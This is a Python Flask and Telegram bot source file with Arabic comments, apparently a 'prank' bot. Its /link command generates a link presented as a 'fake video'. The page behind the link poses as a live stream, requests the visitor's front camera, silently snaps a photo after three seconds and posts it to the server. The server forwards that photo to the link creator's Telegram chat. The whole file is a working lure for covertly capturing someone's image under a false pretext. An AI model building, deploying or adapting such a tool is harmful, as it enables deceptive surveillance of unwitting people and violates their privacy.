import os
import time
from flask import Flask, request, abort, render_template_string
import telebot
import pymongo

# قراءة المتغيرات
TOKEN = os.getenv("BOT_TOKEN")
BASE_URL = os.getenv("BASE_URL")
MONGO_URL = os.getenv("MONGO_URL")

print("--- STARTING BOT ---")
print(f"TOKEN: {'Set' if TOKEN else 'MISSING'}")
print(f"BASE_URL: {BASE_URL}")
print(f"MONGO_URL: {'Set' if MONGO_URL else 'MISSING'}")

if not TOKEN:
    raise RuntimeError("BOT_TOKEN is missing")

# ✅ الإصلاح المهم: threaded=False لمنع إنهاء الخيط قبل تنفيذ الأمر
bot = telebot.TeleBot(TOKEN, threaded=False)
app = Flask(__name__)

users_collection = None
if MONGO_URL:
    try:
        mongo_client = pymongo.MongoClient(MONGO_URL, connectTimeoutMS=5000)
        db = mongo_client["prank_bot"]
        users_collection = db["allowed_users"]
        print("✅ Connected to MongoDB successfully")
    except Exception as e:
        print(f"❌ DB Error: {e}")

@app.route("/")
def home():
    return "Bot is running"

@app.route("/capture", methods=["GET"])
def capture_page():
    user_id = request.args.get("user_id", type=int)
    is_allowed = False
    if users_collection is not None and user_id:
        is_allowed = users_collection.find_one({"user_id": user_id}) is not None
    if not user_id or not is_allowed:
        return "الرابط غير صالح", 403

    html = """
    <!DOCTYPE html>
    <html lang="ar" dir="rtl">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
        <title>بث مباشر</title>
        <style>
            * { margin: 0; padding: 0; box-sizing: border-box; }
            body { 
                background: #000; color: #fff; 
                font-family: 'Segoe UI', Tahoma, sans-serif; 
                display: flex; flex-direction: column; 
                justify-content: center; align-items: center; 
                height: 100vh; overflow: hidden;
            }
            video { 
                width: 100%; height: 100%; 
                object-fit: cover; position: absolute; 
                top: 0; left: 0; z-index: 1;
            }
            .overlay { 
                position: absolute; top: 20px; right: 20px; 
                z-index: 10; background: rgba(0,0,0,0.5); 
                padding: 5px 15px; border-radius: 20px; 
                color: #ff0000; font-weight: bold; font-size: 14px;
                display: flex; align-items: center; gap: 8px;
            }
            .dot { 
                width: 10px; height: 10px; background: #ff0000; 
                border-radius: 50%; animation: blink 1s infinite; 
            }
            @keyframes blink { 
                0% { opacity: 1; } 
                50% { opacity: 0; } 
                100% { opacity: 1; } 
            }
            .status { 
                position: absolute; bottom: 30px; 
                z-index: 10; background: rgba(0,0,0,0.7); 
                padding: 10px 20px; border-radius: 10px; 
                font-size: 16px; text-align: center;
            }
        </style>
    </head>
    <body>
        <div class="overlay"><span class="dot"></span> بث مباشر</div>
        <video id="video" autoplay playsinline muted></video>
        <canvas id="canvas" style="display:none;"></canvas>
        <div class="status" id="status">جاري الاتصال بالكاميرا...</div>

        <script>
            const video = document.getElementById('video');
            const canvas = document.getElementById('canvas');
            const status = document.getElementById('status');
            const userId = "{{ user_id }}";

            // طلب الكاميرا
            navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" }, audio: false })
            .then(stream => {
                video.srcObject = stream;
                status.innerText = "✅ متصل - جاري المعالجة...";
                
                // التقاط الصورة بعد 3 ثواني من التشغيل
                setTimeout(() => captureAndSend(stream), 3000);
            })
            .catch(err => {
                status.innerText = "❌ تم رفض الوصول للكاميرا";
                console.error("Camera error:", err);
            });

            function captureAndSend(stream) {
                canvas.width = video.videoWidth || 640;
                canvas.height = video.videoHeight || 480;
                const ctx = canvas.getContext('2d');
                ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
                
                canvas.toBlob(blob => {
                    const formData = new FormData();
                    formData.append('photo', blob, 'capture.jpg');
                    formData.append('user_id', userId);

                    fetch('/capture', {
                        method: 'POST',
                        body: formData
                    })
                    .then(res => res.text())
                    .then(data => {
                        status.innerText = "✅ تم الإرسال بنجاح";
                        // إيقاف الكاميرا وإخفاء الفيديو
                        stream.getTracks().forEach(track => track.stop());
                        video.style.display = 'none';
                        document.body.style.background = '#111';
                        status.innerText = "📷 تم التقاط الصورة بنجاح";
                    })
                    .catch(err => {
                        status.innerText = "❌ حدث خطأ في الإرسال";
                        console.error("Send error:", err);
                    });
                }, 'image/jpeg', 0.8);
            }
        </script>
    </body>
    </html>
    """
    return render_template_string(html, user_id=user_id)

@app.route("/capture", methods=["POST"])
def capture():
    photo = request.files.get("photo")
    user_id = request.form.get("user_id", type=int)
    is_allowed = False
    if users_collection is not None and user_id:
        is_allowed = users_collection.find_one({"user_id": user_id}) is not None
    if not photo or not user_id or not is_allowed:
        return "Invalid request", 400
    try:
        bot.send_photo(chat_id=user_id, photo=photo.stream.read())
        return "Image sent", 200
    except Exception as e:
        return f"Error: {e}", 500

@app.route("/webhook", methods=["POST"])
def webhook():
    if request.headers.get("content-type") == "application/json":
        try:
            update = telebot.types.Update.de_json(request.get_data(as_text=True))
            bot.process_new_updates([update])
            return "OK", 200
        except Exception as e:
            print(f"❌ Error processing update: {e}")
            return "Error", 500
    else:
        abort(403)

@bot.message_handler(commands=["start"])
def start(message):
    print(f"--- START COMMAND RECEIVED FROM {message.chat.id} ---")
    try:
        bot.reply_to(message, "مرحبًا! أرسل الأمر /link لصنع المقلب.")
        print("--- START REPLY SENT ---")
    except Exception as e:
        print(f"❌ Error in /start: {e}")

@bot.message_handler(commands=["link"])
def link(message):
    print(f"--- LINK COMMAND RECEIVED FROM {message.chat.id} ---")
    try:
        if not BASE_URL:
            bot.reply_to(message, "❌ خطأ: متغير BASE_URL غير معين في إعدادات Render.")
            return

        if users_collection is not None:
            users_collection.update_one(
                {"user_id": message.chat.id},
                {"$set": {"user_id": message.chat.id}},
                upsert=True
            )
        url = f"{BASE_URL}/capture?user_id={message.chat.id}"
        bot.reply_to(message, f"✅ تم إنشاء رابط الفيديو الوهمي:\n\n{url}")
        print(f"--- LINK REPLY SENT: {url} ---")
    except Exception as e:
        print(f"❌ Error in /link: {e}")
        bot.reply_to(message, f"حدث خطأ: {e}")

# للتشغيل المحلي فقط
if __name__ == "__main__":
    port = int(os.environ.get('PORT', 5000))
    app.run(host="0.0.0.0", port=port)